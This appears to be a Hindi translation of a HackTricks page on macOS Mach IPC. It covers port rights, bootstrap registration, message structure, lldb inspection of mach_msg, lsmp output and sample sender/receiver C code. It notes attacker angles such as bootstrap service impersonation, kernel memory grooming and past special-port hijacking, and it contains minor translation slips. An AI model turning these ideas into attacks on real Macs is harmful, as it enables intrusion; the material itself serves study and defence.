# macOS IPC - इंटर प्रोसेस संचार

{{#include ../../../../banners/hacktricks-training.md}}

## मच संदेश भेजना पोर्ट्स के माध्यम से

### बुनियादी जानकारी

मच **कार्य** को संसाधनों को साझा करने के लिए **सबसे छोटे इकाई** के रूप में उपयोग करता है, और प्रत्येक कार्य में **कई थ्रेड** हो सकते हैं। ये **कार्य और थ्रेड 1:1 के अनुपात में POSIX प्रक्रियाओं और थ्रेड्स से मैप होते हैं**।

कार्य के बीच संचार मच इंटर-प्रोसेस संचार (IPC) के माध्यम से होता है, जो एकतरफा संचार चैनलों का उपयोग करता है। **संदेश पोर्ट्स के बीच स्थानांतरित होते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** के रूप में कार्य करते हैं।

एक **पोर्ट** मच IPC का **बुनियादी** तत्व है। इसका उपयोग **संदेश भेजने और प्राप्त करने** के लिए किया जा सकता है।

प्रत्येक प्रक्रिया के पास एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **मच पोर्ट्स** मिल सकते हैं। एक मच पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया किसी अन्य कार्य को कुछ अधिकारों के साथ एक पोर्ट नाम भी भेज सकती है और कर्नेल इस प्रविष्टि को **दूसरे कार्य की IPC तालिका** में प्रदर्शित करेगा।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह परिभाषित करते हैं कि एक कार्य कौन से संचालन कर सकता है, इस संचार के लिए कुंजी हैं। संभावित **पोर्ट अधिकार** हैं ([यहां से परिभाषाएँ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **प्राप्ति अधिकार**, जो पोर्ट पर भेजे गए संदेशों को प्राप्त करने की अनुमति देता है। मच पोर्ट्स MPSC (कई उत्पादक, एक उपभोक्ता) कतारें हैं, जिसका अर्थ है कि पूरे सिस्टम में **प्रत्येक पोर्ट के लिए केवल एक प्राप्ति अधिकार** हो सकता है (पाइप के विपरीत, जहां कई प्रक्रियाएं एक पाइप के पढ़ने के अंत के लिए फ़ाइल वर्णनकर्ता रख सकती हैं)।
- एक **प्राप्ति अधिकार वाला कार्य** संदेश प्राप्त कर सकता है और **भेजने के अधिकार** बना सकता है, जिससे इसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **स्वयं का कार्य अपने पोर्ट पर प्राप्ति अधिकार रखता है**।
- यदि प्राप्ति अधिकार का मालिक **मर जाता है** या इसे मार देता है, तो **भेजने का अधिकार बेकार हो जाता है (मृत नाम)**।
- **भेजने का अधिकार**, जो पोर्ट पर संदेश भेजने की अनुमति देता है।
- भेजने का अधिकार **क्लोन** किया जा सकता है, इसलिए एक कार्य जो भेजने का अधिकार रखता है, अधिकार को क्लोन कर सकता है और **इसे एक तीसरे कार्य को दे सकता है**।
- ध्यान दें कि **पोर्ट अधिकार** को मच संदेशों के माध्यम से भी **बीतित** किया जा सकता है।
- **एक बार भेजने का अधिकार**, जो पोर्ट पर एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
- यह अधिकार **क्लोन** नहीं किया जा सकता, लेकिन इसे **स्थानांतरित** किया जा सकता है।
- **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है न कि एकल पोर्ट। एक पोर्ट सेट से संदेश को डीक्यू करने का अर्थ है कि यह उस पोर्ट में से एक संदेश को डीक्यू करता है जो इसे शामिल करता है। पोर्ट सेट का उपयोग एक साथ कई पोर्ट पर सुनने के लिए किया जा सकता है, जैसे कि Unix में `select`/`poll`/`epoll`/`kqueue`।
- **मृत नाम**, जो वास्तव में एक वास्तविक पोर्ट अधिकार नहीं है, बल्कि केवल एक प्लेसहोल्डर है। जब एक पोर्ट नष्ट हो जाता है, तो पोर्ट के लिए सभी मौजूदा पोर्ट अधिकार मृत नामों में बदल जाते हैं।

**कार्य SEND अधिकारों को दूसरों को स्थानांतरित कर सकते हैं**, जिससे उन्हें वापस संदेश भेजने की अनुमति मिलती है। **SEND अधिकारों को भी क्लोन किया जा सकता है, इसलिए एक कार्य डुप्लिकेट कर सकता है और अधिकार को एक तीसरे कार्य को दे सकता है**। यह, एक मध्यवर्ती प्रक्रिया के साथ मिलकर जिसे **बूटस्ट्रैप सर्वर** कहा जाता है, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### फ़ाइल पोर्ट्स

फ़ाइल पोर्ट्स मैक पोर्ट्स में फ़ाइल वर्णनकर्ताओं को संलग्न करने की अनुमति देते हैं (मच पोर्ट अधिकारों का उपयोग करते हुए)। एक दिए गए FD से `fileport_makeport` का उपयोग करके एक `fileport` बनाना संभव है और एक फ़ाइलपोर्ट से FD बनाने के लिए `fileport_makefd` का उपयोग करना संभव है।

### संचार स्थापित करना

जैसा कि पहले उल्लेख किया गया है, मच संदेशों का उपयोग करके अधिकार भेजना संभव है, हालाँकि, आप **बिना पहले से अधिकार के मच संदेश भेज नहीं सकते**। तो, पहला संचार कैसे स्थापित किया जाता है?

इसके लिए, **बूटस्ट्रैप सर्वर** (**launchd** मैक में) शामिल होता है, क्योंकि **हर कोई बूटस्ट्रैप सर्वर को SEND अधिकार प्राप्त कर सकता है**, यह किसी अन्य प्रक्रिया को संदेश भेजने के लिए अधिकार मांगने की अनुमति देता है:

1. कार्य **A** एक **नया पोर्ट** बनाता है, उस पर **प्राप्ति अधिकार** प्राप्त करता है।
2. कार्य **A**, जो प्राप्ति अधिकार का धारक है, **पोर्ट के लिए एक SEND अधिकार उत्पन्न करता है**।
3. कार्य **A** **बूटस्ट्रैप सर्वर** के साथ एक **संयोग** स्थापित करता है, और **उसे पोर्ट के लिए SEND अधिकार भेजता है** जिसे उसने शुरुआत में उत्पन्न किया था।
- याद रखें कि कोई भी बूटस्ट्रैप सर्वर को SEND अधिकार प्राप्त कर सकता है।
4. कार्य A बूटस्ट्रैप सर्वर को एक `bootstrap_register` संदेश भेजता है ताकि **दिए गए पोर्ट को एक नाम से जोड़ सके** जैसे `com.apple.taska`
5. कार्य **B** बूटस्ट्रैप सर्वर के साथ बातचीत करता है ताकि सेवा नाम के लिए बूटस्ट्रैप **लुकअप** कर सके (`bootstrap_lookup`)। ताकि बूटस्ट्रैप सर्वर प्रतिक्रिया दे सके, कार्य B इसे एक **SEND अधिकार** भेजेगा जो उसने पहले लुकअप संदेश के भीतर बनाया था। यदि लुकअप सफल होता है, तो **सर्वर SEND अधिकार को डुप्लिकेट करता है** जो कार्य A से प्राप्त हुआ था और **इसे कार्य B को संप्रेषित करता है**।
- याद रखें कि कोई भी बूटस्ट्रैप सर्वर को SEND अधिकार प्राप्त कर सकता है।
6. इस SEND अधिकार के साथ, **कार्य B** **कार्य A** को **संदेश भेजने में सक्षम है**।
7. द्विदिश संचार के लिए आमतौर पर कार्य **B** एक **प्राप्ति** अधिकार और एक **SEND** अधिकार के साथ एक नया पोर्ट उत्पन्न करता है, और **SEND अधिकार कार्य A को देता है** ताकि वह कार्य B को संदेश भेज सके (द्विदिश संचार)।

बूटस्ट्रैप सर्वर **सेवा नाम** का प्रमाणीकरण नहीं कर सकता जो एक कार्य द्वारा दावा किया गया है। इसका अर्थ है कि एक **कार्य** संभावित रूप से **किसी भी सिस्टम कार्य का अनुकरण** कर सकता है, जैसे कि झूठा **प्राधिकरण सेवा नाम का दावा करना** और फिर हर अनुरोध को मंजूरी देना।

फिर, Apple **सिस्टम-प्रदत्त सेवाओं के नाम** को सुरक्षित कॉन्फ़िगरेशन फ़ाइलों में संग्रहीत करता है, जो **SIP-सुरक्षित** निर्देशिकाओं में स्थित हैं: `/System/Library/LaunchDaemons` और `/System/Library/LaunchAgents`। प्रत्येक सेवा नाम के साथ, **संबंधित बाइनरी भी संग्रहीत होती है**। बूटस्ट्रैप सर्वर, इन सेवा नामों के लिए एक **प्राप्ति अधिकार बनाएगा और रखेगा**।

इन पूर्वनिर्धारित सेवाओं के लिए, **लुकअप प्रक्रिया थोड़ी भिन्न होती है**। जब एक सेवा नाम की खोज की जा रही होती है, तो launchd सेवा को गतिशील रूप से शुरू करता है। नया कार्यप्रवाह इस प्रकार है:

- कार्य **B** एक सेवा नाम के लिए बूटस्ट्रैप **लुकअप** शुरू करता है।
- **launchd** जांचता है कि कार्य चल रहा है और यदि नहीं है, तो **इसे शुरू करता है**।
- कार्य **A** (सेवा) एक **बूटस्ट्रैप चेक-इन** (`bootstrap_check_in()`) करता है। यहाँ, **बूटस्ट्रैप** सर्वर एक SEND अधिकार बनाता है, इसे रखता है, और **प्राप्ति अधिकार कार्य A को स्थानांतरित करता है**।
- launchd **SEND अधिकार को डुप्लिकेट करता है और इसे कार्य B को भेजता है**।
- कार्य **B** एक नया पोर्ट उत्पन्न करता है जिसमें एक **प्राप्ति** अधिकार और एक **SEND** अधिकार होता है, और **SEND अधिकार कार्य A को देता है** (सेवा) ताकि वह कार्य B को संदेश भेज सके (द्विदिश संचार)।

हालांकि, यह प्रक्रिया केवल पूर्वनिर्धारित सिस्टम कार्यों पर लागू होती है। गैर-प्रणाली कार्य अभी भी मूल रूप से वर्णित तरीके से कार्य करते हैं, जो अनुकरण की अनुमति दे सकता है।

> [!CAUTION]
> इसलिए, launchd कभी भी क्रैश नहीं होना चाहिए या पूरा सिस्टम क्रैश हो जाएगा।

### एक मच संदेश

[यहां अधिक जानकारी प्राप्त करें](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` फ़ंक्शन, जो मूल रूप से एक सिस्टम कॉल है, मच संदेश भेजने और प्राप्त करने के लिए उपयोग किया जाता है। फ़ंक्शन को भेजे जाने वाले संदेश को प्रारंभिक तर्क के रूप में आवश्यक है। यह संदेश `mach_msg_header_t` संरचना के साथ शुरू होना चाहिए, इसके बाद वास्तविक संदेश सामग्री होती है। संरचना को इस प्रकार परिभाषित किया गया है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
प्रक्रियाएँ जिनके पास _**receive right**_ है, वे Mach पोर्ट पर संदेश प्राप्त कर सकती हैं। इसके विपरीत, **senders** को _**send**_ या _**send-once right**_ दिया जाता है। send-once right विशेष रूप से एकल संदेश भेजने के लिए है, जिसके बाद यह अमान्य हो जाता है।

प्रारंभिक फ़ील्ड **`msgh_bits`** एक बिटमैप है:

- पहला बिट (सबसे महत्वपूर्ण) यह संकेत देने के लिए उपयोग किया जाता है कि संदेश जटिल है (इस पर नीचे और अधिक)
- 3रा और 4था कर्नेल द्वारा उपयोग किया जाता है
- **दूसरे बाइट के 5 सबसे कम महत्वपूर्ण बिट्स** का उपयोग **voucher** के लिए किया जा सकता है: कुंजी/मान संयोजनों को भेजने के लिए एक और प्रकार का पोर्ट।
- **तीसरे बाइट के 5 सबसे कम महत्वपूर्ण बिट्स** का उपयोग **स्थानीय पोर्ट** के लिए किया जा सकता है
- **चौथे बाइट के 5 सबसे कम महत्वपूर्ण बिट्स** का उपयोग **दूरस्थ पोर्ट** के लिए किया जा सकता है

voucher, स्थानीय और दूरस्थ पोर्ट में निर्दिष्ट किए जा सकने वाले प्रकार हैं (से [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
उदाहरण के लिए, `MACH_MSG_TYPE_MAKE_SEND_ONCE` का उपयोग इस पोर्ट के लिए एक **send-once** **right** को व्युत्पन्न और स्थानांतरित करने के लिए **संकेत** देने के लिए किया जा सकता है। इसे प्राप्तकर्ता को उत्तर देने से रोकने के लिए `MACH_PORT_NULL` के रूप में भी निर्दिष्ट किया जा सकता है।

एक आसान **bi-directional communication** प्राप्त करने के लिए, एक प्रक्रिया **mach port** को निर्दिष्ट कर सकती है जो **message header** में _reply port_ (**`msgh_local_port`**) कहलाता है, जहाँ संदेश का **receiver** इस संदेश का **reply** भेज सकता है।

> [!TIP]
> ध्यान दें कि इस प्रकार की bi-directional communication का उपयोग XPC संदेशों में किया जाता है जो एक replay की अपेक्षा करते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आमतौर पर विभिन्न पोर्ट बनाए जाते हैं** जैसा कि पहले समझाया गया है, bi-directional communication बनाने के लिए।

संदेश हेडर के अन्य क्षेत्र हैं:

- `msgh_size`: पूरे पैकेट का आकार।
- `msgh_remote_port`: वह पोर्ट जिस पर यह संदेश भेजा जाता है।
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)।
- `msgh_id`: इस संदेश की ID, जिसे प्राप्तकर्ता द्वारा व्याख्यायित किया जाता है।

> [!CAUTION]
> ध्यान दें कि **mach messages एक `mach port` के माध्यम से भेजे जाते हैं**, जो एक **एकल प्राप्तकर्ता**, **कई प्रेषक** संचार चैनल है जो mach कर्नेल में निर्मित है। **कई प्रक्रियाएँ** एक mach port पर **संदेश भेज सकती हैं**, लेकिन किसी भी समय केवल **एकल प्रक्रिया ही पढ़ सकती है**।

संदेश फिर **`mach_msg_header_t`** हेडर द्वारा निर्मित होते हैं, इसके बाद **body** और **trailer** (यदि कोई हो) होता है और यह उत्तर देने की अनुमति दे सकता है। इन मामलों में, कर्नेल को केवल एक कार्य से दूसरे कार्य में संदेश को पास करने की आवश्यकता होती है।

एक **trailer** **कर्नेल द्वारा संदेश में जोड़ी गई जानकारी** है (उपयोगकर्ता द्वारा सेट नहीं की जा सकती) जिसे संदेश प्राप्ति में `MACH_RCV_TRAILER_<trailer_opt>` फ्लैग के साथ अनुरोध किया जा सकता है (विभिन्न जानकारी अनुरोध की जा सकती है)।

#### जटिल संदेश

हालांकि, अन्य अधिक **जटिल** संदेश हैं, जैसे अतिरिक्त पोर्ट अधिकारों को पास करने या मेमोरी साझा करने वाले, जहाँ कर्नेल को भी इन वस्तुओं को प्राप्तकर्ता को भेजने की आवश्यकता होती है। इन मामलों में, हेडर `msgh_bits` का सबसे महत्वपूर्ण बिट सेट होता है।

पास करने के लिए संभावित वर्णनकर्ताओं को [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) में परिभाषित किया गया है:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32बिट्स में, सभी विवरण 12B होते हैं और विवरण प्रकार 11वें में होता है। 64 बिट्स में, आकार भिन्न होते हैं।

> [!CAUTION]
> कर्नेल एक कार्य से दूसरे कार्य में विवरणों की कॉपी करेगा लेकिन पहले **कर्नेल मेमोरी में एक कॉपी बनाएगा**। इस तकनीक को "फेंग शुई" के रूप में जाना जाता है और इसे कई शोषणों में **कर्नेल को अपनी मेमोरी में डेटा कॉपी करने** के लिए दुरुपयोग किया गया है जिससे एक प्रक्रिया अपने लिए विवरण भेजती है। फिर प्रक्रिया संदेश प्राप्त कर सकती है (कर्नेल उन्हें मुक्त करेगा)।
>
> यह भी संभव है कि **एक कमजोर प्रक्रिया को पोर्ट अधिकार भेजें**, और पोर्ट अधिकार बस प्रक्रिया में दिखाई देंगे (भले ही वह उन्हें संभाल नहीं रही हो)।

### मैक पोर्ट्स एपीआई

ध्यान दें कि पोर्ट कार्य नामस्थान से जुड़े होते हैं, इसलिए एक पोर्ट बनाने या खोजने के लिए, कार्य नामस्थान को भी क्वेरी किया जाता है (अधिक जानकारी के लिए `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **एक पोर्ट बनाएँ**।
- `mach_port_allocate` एक **पोर्ट सेट** भी बना सकता है: पोर्ट्स के समूह पर प्राप्त अधिकार। जब भी एक संदेश प्राप्त होता है, यह इंगित किया जाता है कि यह किस पोर्ट से था।
- `mach_port_allocate_name`: पोर्ट का नाम बदलें (डिफ़ॉल्ट 32बिट पूर्णांक)
- `mach_port_names`: एक लक्ष्य से पोर्ट नाम प्राप्त करें
- `mach_port_type`: एक नाम पर कार्य के अधिकार प्राप्त करें
- `mach_port_rename`: एक पोर्ट का नाम बदलें (FDs के लिए dup2 की तरह)
- `mach_port_allocate`: एक नया RECEIVE, PORT_SET या DEAD_NAME आवंटित करें
- `mach_port_insert_right`: एक पोर्ट में एक नया अधिकार बनाएं जहां आपके पास RECEIVE है
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **मच संदेश भेजने और प्राप्त करने** के लिए उपयोग की जाने वाली फ़ंक्शन। ओवरराइट संस्करण संदेश प्राप्ति के लिए एक अलग बफर निर्दिष्ट करने की अनुमति देता है (दूसरा संस्करण बस इसका पुन: उपयोग करेगा)।

### डिबग mach_msg

चूंकि फ़ंक्शन **`mach_msg`** और **`mach_msg_overwrite`** संदेश भेजने और प्राप्त करने के लिए उपयोग किए जाते हैं, इसलिए उन पर एक ब्रेकपॉइंट सेट करने से भेजे गए और प्राप्त संदेशों का निरीक्षण करने की अनुमति मिलेगी।

उदाहरण के लिए, किसी भी एप्लिकेशन को डिबग करना शुरू करें जिसे आप डिबग कर सकते हैं क्योंकि यह **`libSystem.B` लोड करेगा जो इस फ़ंक्शन का उपयोग करेगा**।

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`** के तर्क प्राप्त करने के लिए रजिस्टरों की जांच करें। ये तर्क हैं (से [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
रेजिस्ट्री से मान प्राप्त करें:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
संदेश हेडर की जांच करें पहले तर्क की जांच करते हुए:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
उस प्रकार का `mach_msg_bits_t` उत्तर की अनुमति देने के लिए बहुत सामान्य है।

### पोर्टों की गणना करें
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**नाम** वह डिफ़ॉल्ट नाम है जो पोर्ट को दिया गया है (चेक करें कि यह पहले 3 बाइट्स में कैसे **बढ़ रहा** है)। **`ipc-object`** पोर्ट का **अज्ञात** अद्वितीय **पहचानकर्ता** है।\
यह भी ध्यान दें कि केवल **`send`** अधिकार वाले पोर्ट इसके **स्वामी की पहचान** कर रहे हैं (पोर्ट नाम + pid)।\
यह भी ध्यान दें कि **`+`** का उपयोग **एक ही पोर्ट से जुड़े अन्य कार्यों** को इंगित करने के लिए किया गया है।

यह भी संभव है कि [**procesxp**](https://www.newosxbook.com/tools/procexp.html) का उपयोग करके **पंजीकृत सेवा नामों** को देखा जा सके (SIP को `com.apple.system-task-port` की आवश्यकता के कारण अक्षम किया गया है):
```
procesp 1 ports
```
आप इस टूल को iOS में [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके इंस्टॉल कर सकते हैं।

### कोड उदाहरण

ध्यान दें कि **प्रेषक** एक पोर्ट **आवंटित** करता है, नाम `org.darlinghq.example` के लिए एक **भेजने का अधिकार** बनाता है और इसे **बूटस्ट्रैप सर्वर** पर भेजता है जबकि प्रेषक ने उस नाम के **भेजने के अधिकार** के लिए अनुरोध किया और इसका उपयोग **संदेश भेजने** के लिए किया।

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## विशेष पोर्ट

कुछ विशेष पोर्ट हैं जो **कुछ संवेदनशील क्रियाएँ करने या कुछ संवेदनशील डेटा तक पहुँचने** की अनुमति देते हैं यदि कार्यों के पास उनके ऊपर **SEND** अनुमतियाँ हैं। यह इन पोर्टों को हमलावरों के दृष्टिकोण से बहुत दिलचस्प बनाता है, न केवल क्षमताओं के कारण बल्कि इसलिए भी क्योंकि यह **कार्य के बीच SEND अनुमतियाँ साझा करना** संभव है।

### होस्ट विशेष पोर्ट

इन पोर्टों का प्रतिनिधित्व एक संख्या द्वारा किया जाता है।

**SEND** अधिकार **`host_get_special_port`** को कॉल करके प्राप्त किए जा सकते हैं और **RECEIVE** अधिकार **`host_set_special_port`** को कॉल करके। हालाँकि, दोनों कॉल के लिए **`host_priv`** पोर्ट की आवश्यकता होती है जिसे केवल रूट ही एक्सेस कर सकता है। इसके अलावा, अतीत में रूट **`host_set_special_port`** को कॉल करके मनमाने तरीके से हाइजैक कर सकता था, जिससे उदाहरण के लिए कोड सिग्नेचर को बायपास करना संभव हो गया था, `HOST_KEXTD_PORT` को हाइजैक करके (SIP अब इसे रोकता है)।

इनका विभाजन 2 समूहों में किया गया है: **पहले 7 पोर्ट कर्नेल द्वारा स्वामित्व में हैं**, जिसमें 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` और 7 `HOST_MAX_SPECIAL_KERNEL_PORT` है।\
